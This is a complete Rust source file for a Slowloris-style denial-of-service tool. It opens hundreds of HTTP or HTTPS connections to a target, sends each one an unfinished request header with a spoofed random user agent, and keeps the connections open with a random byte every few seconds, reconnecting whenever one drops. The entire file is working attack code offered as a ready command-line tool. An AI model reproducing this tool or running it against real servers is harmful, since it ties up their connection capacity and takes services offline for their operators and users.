/*
Copyright (c) 2021 trivernis
See LICENSE for more information
 */
use native_tls::TlsConnector;
use scheduled_thread_pool::ScheduledThreadPool;
use std::io::Write;
use std::net::TcpStream;
use std::sync::Arc;
use std::thread;
use std::time::Duration;
use structopt::StructOpt;

#[derive(StructOpt, Debug)]
#[structopt()]
struct Opt {
    /// The target address with port
    #[structopt()]
    pub address: String,

    // The port to connect to
    #[structopt(short, long, default_value = "443")]
    pub port: u32,

    /// If the connection should use plain http
    #[structopt(short, long)]
    pub http: bool,

    /// Number of connections
    #[structopt(short = "n", long, default_value = "200")]
    pub count: usize,
}

fn main() {
    let opts: Opt = Opt::from_args();
    let pool = Arc::new(scheduled_thread_pool::ScheduledThreadPool::new(
        num_cpus::get(),
    ));

    for i in 0..opts.count {
        let address = opts.address.clone();
        let port = opts.port;
        let https = !opts.http;

        keep_alive(Arc::clone(&pool), i, address, port, https);
    }
    thread::park();
}

/// Sends Keep-Alive data to the server
fn keep_alive(pool: Arc<ScheduledThreadPool>, i: usize, address: String, port: u32, https: bool) {
    if let Some(mut stream) = create_connection(&*address, port, https) {
        print!("Connection {} established.                          \r", i);
        let pool_clone = Arc::clone(&pool);

        pool.execute_at_fixed_rate(
            Duration::from_secs(fakeit::misc::random(5, 10)),
            Duration::from_secs(fakeit::misc::random(5, 10)),
            move || {
                print!("Sending Keep-Alive-Header for connection {}...\r", i);

                if let Err(e) = stream.write_all(&[fakeit::misc::random(0u8, 255u8)]) {
                    let address = address.clone();
                    let pool_clone2 = Arc::clone(&pool_clone);
                    println!("Connection {} lost: {}. Reestablishing...", i, e);

                    pool_clone.execute(move || {
                        keep_alive(pool_clone2, i, address, port, https);
                    });
                }
            },
        );
    }
}

/// Creates a single HTTP/S connection
fn create_connection(
    address: &str,
    port: u32,
    https: bool,
) -> Option<Box<dyn Write + Send + Sync>> {
    let tcp_stream = TcpStream::connect(format!("{}:{}", address, port))
        .map_err(|e| {
            eprint!("Failed to establish connection: {}", e);
            e
        })
        .ok()?;

    let mut stream: Box<dyn Write + Send + Sync> = if https {
        let connector = TlsConnector::new().ok()?;
        let tls_stream = connector.connect(&*address.clone(), tcp_stream).ok()?;
        Box::new(tls_stream)
    } else {
        Box::new(tcp_stream)
    };
    stream
        .write_all(
            format!(
                "GET / HTTP/1.0\r\nUser-Agent: {}\r\nX-a: ",
                fakeit::user_agent::random_platform()
            )
            .as_bytes(),
        )
        .ok()?;

    Some(stream)
}
